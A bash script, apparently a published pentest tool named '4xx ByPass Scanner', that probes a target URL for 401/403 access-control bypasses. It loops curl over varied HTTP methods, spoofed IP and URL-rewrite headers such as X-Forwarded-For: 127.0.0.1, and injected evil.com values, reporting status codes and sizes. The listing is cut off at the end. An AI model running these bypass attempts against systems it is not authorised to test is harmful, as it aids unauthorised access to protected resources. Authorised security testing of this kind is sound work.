#!/bin/bash


# color variables

red='\e[31m'

green='\e[32m'

blue='\e[34m'

ltcyan='\e[96m'

yellow='\e[33m'

end='\e[0m'


print_result() {

  local code=$1

  local size=$2


  case $code in

    2*)

      color=$green

      ;;

    3*)

      color=$ltcyan

      ;;

    4*)

      color=$yellow

      ;;

    5*)

      color=$red

      ;;

    *)

      color=$blue

      ;;

  esac

  echo -en "  ${blue}Status: ${end}${color}$code$end - ${blue}Size: ${color}$size${end} "

}


help() {

  figlet 4xx ByPass


  echo -e "                                              ${ltcyan}- By Vigrahak${end}"

  echo -e "${red}Have a beer🍺 : ${ltcyan}https://www.paypal.com/paypalme/SourabhS1828"      

  echo " "

  bar='###########################################################'

  for i in {1..100}; do

    if [[ $i > 0 ]]; then

      color=${red}

    fi

    if [[ $i > 15 ]]; then

      color=${red}

    fi

    if [[ $i > 30 ]]; then

      color=${yellow}

    fi

    if [[ $i > 50 ]]; then

      color=${green}

    fi

    if [[ $i > 75 ]]; then

      color=${green}

    fi

    echo -ne "${color}${bar:0:$i}\r"

    sleep .02

  done

  

  echo -ne "${green}# Attacking targets without mutual consent is illegal! ####${reset}\n"

  sleep 1

  echo -e "\n${red}==================${green}  401/403 ByPass Scanner ${red}================\n${reset}"

  sleep 1

  echo ""

  echo -e "${ltcyan}Usage: ${green}4xxbypass.sh <Domain/Path>"

  echo ""

  echo -e "${ltcyan}Example: ${green}4xxbypass.sh example.com"

  echo "        4xxbypass.sh http://example.com"

  echo "       4xxbypass.sh https://example.com"

  exit 0

}


if [ $# -eq 0 ]; then

  help

fi


while getopts ":h" opt; do

  case $opt in

    h) help ;;

    \?) echo "Invalid option: -$OPTARG"; exit 1 ;;

  esac

done


update() {

  echo -e "${green}Updating 4xx ByPass Scanner...${end}"

  git clone https://github.com/Vigrahak/4xxBypas.git

  cd 4xxBypas

  sudo bash ./install.sh

  rm -rf 4xxBypas

  echo -e "${green}Update successful!${end}"

  exit 0

}


if [ $# -eq 0 ]; then

  help

fi


while getopts ":u" opt; do

  case $opt in

    u) update ;;

    \?) echo "Invalid option: -$OPTARG"; exit 1 ;;

  esac

done


shift $((OPTIND-1))


figlet 4xx ByPass


echo -e "                                              ${ltcyan}- By Vigrahak${end}"

echo -e "${red}Have a beer🍺 : ${ltcyan}https://www.paypal.com/paypalme/SourabhS1828"


bar='###########################################################'

for i in {1..100}; do

  if [[ $i > 0 ]]; then

    color=${red}

  fi

  if [[ $i > 15 ]]; then

    color=${red}

  fi

  if [[ $i > 30 ]]; then

    color=${yellow}

  fi

  if [[ $i > 50 ]]; then

    color=${green}

  fi

  if [[ $i > 75 ]]; then

    color=${green}

  fi

  echo -ne "${color}${bar:0:$i}\r"

  sleep .02

done


echo -ne "${green}# Attacking targets without mutual consent is illegal! ####${reset}\n"

sleep 1

echo -e "\n${red}==================${green}  401/403 ByPass Scanner ${red}================\n${reset}"

sleep 1

        echo -e ${red}"----------------------"${end}
	echo -e ${ltcyan}"[+] HTTP Method Bypass"${end}
	echo -e ${red}"----------------------"${end}

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X GET -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X GET -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X GET : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X POST -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X POST -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X POST : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X OPTIONS -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X OPTIONS -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X OPTIONS : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X PUT -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X PUT -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X PUT : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X TRACE -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X TRACE -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X TRACE : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X PATCH -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X PATCH -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X PATCH : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X TRACK -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X TRACK -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X TRACK : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X CONNECT -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X CONNECT -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X CONNECT : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X UPDATE -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X UPDATE -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X UPDATE : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X LOCK -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X LOCK -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X LOCK : ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X HEAD -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X HEAD -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X HEAD : ${url}"
done
	
        echo -e "${red}----------------------${end}"
        echo -e "${ltcyan}[+] HTTP Header Bypass${end}"
        echo -e "${red}----------------------${end}"

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "True-Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "True-Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> True-Client-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-WAP-Profile: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-WAP-Profile: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-WAP-Profile: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Profile: http://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Profile: http://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Profile: http://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Arbitrary: http://evil.com"  -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Arbitrary: http://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Arbitrary: http://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-HTTP-DestinationURL: http://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-HTTP-DestinationURL:http://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-HTTP-DestinationURL: http://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Proto: http://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Proto: http://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Proto: http://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Profile: https://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Profile: https://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Profile: https://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Arbitrary: https://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Arbitrary: https://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Arbitrary: https://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-HTTP-DestinationURL: https://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-HTTP-DestinationURL: https//evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-HTTP-DestinationURL: https://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Proto: https://evil.com" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Proto: https://evil.com" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Proto: https://evil.com - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Destination: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Destination: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Destination: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Referer: ${url}" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Referer: ${url}" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Referer: ${url} - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "CF-Connecting_IP: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "CF-Connecting_IP: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> CF-Connecting_IP: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Custom-ip-Authorization: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Custom-ip-Authorization: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Custom-ip-Authorization: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Remote-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Remote-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Remote-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Client-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Host: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Host: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Host: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Host: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Host: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Original-Url: ${url}" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Original-Url: ${url}" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Original-Url: ${url} - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Rewrite-Url: ${url}" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Rewrite-Url: ${url}" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Rewrite-Url: ${url} - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Content-Length: 0" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Content-Length: 0" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Content-Length: 0 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Proxyuser-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Proxyuser-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Proxyuser-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Base-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Base-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Base-Url: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Client-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Http-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Http-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Http-Url: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Proxy-Host: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Proxy-Host: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Proxy-Host: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Proxy-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Proxy-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Proxy-Url: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Real-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Real-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Real-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Redirect: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Redirect: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Redirect: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Request-Uri: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Request-Uri: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Request-Uri: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Uri: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Uri: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Uri: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Url: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forward-For: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forward-For: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forward-For: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-By: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-By: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forward-By: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-For-Original: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-For-Original: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-For-Original: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-For-Server: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-For-Server: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-For-Server: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarder-For: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarder-For: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarder-For: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Http-Destinationurl: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Http-Destinationurl: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Http-Destinationurl: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Http-Host-Override: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Http-Host-Override: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Http-Host-Override: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Original-Remote-Addr: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Original-Remote-Addr: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Original-Remote-Addr: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Proxy-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Proxy-Url: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Proxy-Url: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Real-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Real-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Real-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Remote-Addr: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Remote-Addr: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Remote-Addr: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Oreferrer: https%3A%2F%2Fwww.google.com%2F" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Oreferrer: https%3A%2F%2Fwww.google.com%2F" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Oreferrer: https%3A%2F%2Fwww.google.com%2F - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "Client-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> Client-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Custom-ip-Authorization: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Custom-ip-Authorization: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Custom-ip-Authorization: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-True-iP: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-True-iP: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-True-iP: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Originally-Forwarded-For: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Originally-Forwarded-For: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Originally-Forwarded-For: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Originating-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Originating-ip: 127.0.0.1" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Originating-ip: 127.0.0.1 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Requested-With: XMLHttpRequest" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Requested-With: XMLHttpRequest" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Requested-With: XMLHttpRequest - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" "$url")
print_result "$code" "$size"
echo "  --> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8" "$url")
print_result "$code" "$size"
echo "  --> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36" "$url")
print_result "$code" "$size"
echo "  --> User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 - ${url}"
done


	echo -e ${red}"-------------------------"${end}
	echo -e ${ltcyan}"[+] Protocol Based Bypass"${end}
	echo -e ${red}"-------------------------"${end}

for url in "$1$2" "$1/http://evil.com$2" "$1/https://evil.com$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -X GET  -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -X GET -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> -X GET - ${url}"
done

for url in "$1$2" "$1http://evil.com$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Scheme: http" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Scheme: http" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Scheme: http - ${url}"
done

for url in "$1$2" "$1https://evil.com$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Scheme: https" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Scheme: https" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Scheme: https - ${url}"
